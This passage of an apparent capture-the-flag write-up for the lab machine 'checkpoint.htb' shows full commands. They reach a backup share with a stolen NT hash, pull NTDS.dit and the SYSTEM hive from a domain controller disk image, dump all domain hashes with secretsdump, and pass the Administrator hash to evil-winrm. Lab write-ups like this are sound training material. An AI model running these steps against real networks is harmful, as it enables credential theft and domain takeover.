With a working hash for `svc_deploy`, the obvious next question was what that account could actually reach. Going back through the SharpHound data I had already collected as `ryan.brooks`, I found `svc_deploy` sitting in a group called `BackupAccess`, which held read rights on `VMBackups`, the one share every earlier account had been denied.

```bash
└─[$] smbclient -U 'checkpoint.htb/svc_deploy' --pw-nt-hash <svc_deploy NT hash> //dc01.checkpoint.htb/VMBackups -c 'recurse ON; ls'
```

The share held a `.vhdx`, a full virtual disk image, and the name made it clear this was a snapshot of the domain controller itself rather than some incidental file backup. I pulled it down to work on locally.

```bash
└─[$] smbclient -U 'checkpoint.htb/svc_deploy' --pw-nt-hash <svc_deploy NT hash> //dc01.checkpoint.htb/VMBackups -c 'get DC01-Backup.vhdx'
```

A VHDX is just a disk image container, so once it was local I mounted it with the `libguestfs` tools and browsed it exactly as if it were a real drive.

```bash
└─[$] virt-filesystems --long -a DC01-Backup.vhdx
└─[$] sudo guestmount -a DC01-Backup.vhdx -m /dev/sda2 --ro /mnt/vhdx
```

Any Windows install keeps its entire directory database and the key material to decrypt it in two predictable places, `Windows\NTDS\NTDS.dit` and the `SYSTEM` registry hive, so those were the only two files I actually needed to lift before unmounting.

```bash
└─[$] cp /mnt/vhdx/Windows/NTDS/NTDS.dit ./NTDS.dit
└─[$] cp /mnt/vhdx/Windows/System32/config/SYSTEM ./SYSTEM
└─[$] sudo guestunmount /mnt/vhdx
```

With both files sitting locally I did not need to touch the network again for the payoff. `secretsdump.py` in local mode reads the boot key material out of the `SYSTEM` hive and uses it to decrypt every account hash stored inside `NTDS.dit`, entirely offline.

```bash
└─[$] impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

That produced NT hashes for every account in the domain, Administrator included, lifted from a backup that nobody had bothered to lock down as tightly as the live directory itself. I took the Administrator hash and passed it straight into `evil-winrm` rather than spending time trying to crack it.

```bash
└─[$] evil-winrm -i dc01.checkpoint.htb -u Administrator -H <Administrator NT hash>
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
checkpoint\administrator
```

`cat root.txt` returns the flag for this instance. Looking back at the full chain, this box strings together four genuinely distinct primitives: a recoverable tombstoned AD object, a supply-chain trust assumption in an internal extension-review process, the BadSuccessor dMSA predecessor-key disclosure, and an offline-accessible VM backup of a domain controller. None of them looks like "the" vulnerability in isolation, it is only in seeing how cleanly each one hands off to the next that the whole path becomes obvious.

## References

- BadSuccessor, abusing dMSA for privilege escalation in Active Directory (Akamai) <https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory>
- bloodyAD <https://github.com/CravateRouge/bloodyAD>
- Rubeus <https://github.com/GhostPack/Rubeus>
- The dMSA key extraction, VM backup discovery, and NTDS.dit extraction steps that finish this chain were cross-referenced against public writeups for this box.
